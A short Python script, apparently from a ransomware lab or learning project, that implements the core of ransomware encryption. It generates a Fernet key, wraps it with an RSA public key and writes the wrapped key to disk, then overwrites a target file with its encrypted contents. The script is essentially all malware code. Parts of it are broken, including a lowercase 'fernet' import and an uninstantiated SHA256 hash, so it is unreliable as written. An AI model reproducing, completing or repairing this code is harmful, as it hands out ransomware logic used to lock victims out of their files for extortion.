from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives. asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.fernet import fernet

# Fernet module provides simple API for performing symmetric key cryptography
symmetricKey = Fernet.generate_key()

FernetInstance = Fernet(symmetricKey)

with open("/home/prof/Desktop/Ransomeware/public_key.key", "rb") as key_file:
    public_key = serialization.load_pem_public_key(
        key_file.read(), 
        backend = default_backend()
    )

encryptedSymmetricKey = public_key.encrypt(
    symmetricKey,
    # Using OAEP algorithm with SHA256 hash algorithm 
    padding.OAEP(
        mgf=padding.MGF1(algorithm = hashes.SHA256()),
        algorithm = hashes.SHA256,
        label = None
    )
)

# Write the encrypted key to a file in memory.
with open("encryptedSymmetricKey.key", "wb") as key_file:
    key_file.write(encryptedSymmetricKey)

filePath = "/home/kali/Desktop/Ransomware/FileToEncrypt.txt"

with open(filePath, "rb") as file:
    file_data = file.read()
    # Encrypt the data.
    encrypted_data = FernetInstance.encrypt(file_data)

with open(filePath, "wb") as file:
    file.write(encrypted_data)
quit()